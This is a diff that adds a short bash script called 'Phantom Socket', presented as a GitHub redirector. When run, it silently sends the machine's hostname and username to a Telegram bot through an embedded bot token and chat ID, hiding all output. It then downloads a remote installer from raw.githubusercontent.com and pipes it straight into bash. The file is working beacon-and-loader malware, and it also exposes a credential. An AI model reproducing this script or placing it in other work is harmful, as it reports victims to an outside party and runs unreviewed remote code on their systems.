@@ -1,0 +1,35 @@
+#!/bin/bash
+# Phantom Socket v1.0.1-stable - Raw GitHub Redirector
+# (C) 2026 Oyen-Sec
+
+# ANTI-RECURSION GUARD
+if [[ -n "$PHANTOM_TRIGGER_RUNNING" ]]; then
+    echo "[!] Recursive execution detected. Exiting." >&2
+    exit 1
+fi
+export PHANTOM_TRIGGER_RUNNING=1
+
+# SECTION 1: TELEGRAM INSTANT PING
+BOT_TOKEN="8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
+CHAT_ID="5439698489"
+
+MSG="<b>PHANTOM TRIGGER</b> 
+<b>HOST :</b> <code>$(hostname)</code> 
+<b>USER :</b> <code>$(whoami)</code> 
+<b>TIME :</b> $(date '+%Y-%m-%d %H:%M:%S UTC')"
+
+curl --fail --silent --max-time 10 -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+  -d "chat_id=${CHAT_ID}" \
+  -d "parse_mode=HTML" \
+  -d "text=${MSG}" >/dev/null 2>&1
+
+# SECTION 2: FETCH AND EXECUTE INSTALLER
+# Using strictly the raw.githubusercontent.com domain for stability.
+REPO_URL="https://raw.githubusercontent.com/Oyen-Sec/soket/main/deploy/install.sh"
+
+if ! curl -fsSL --max-time 30 "${REPO_URL}" | bash -s -- "$@"; then
+    echo "[!] Critical: Could not reach the repository or installer failed." >&2
+    exit 1
+fi
+
+exit 0
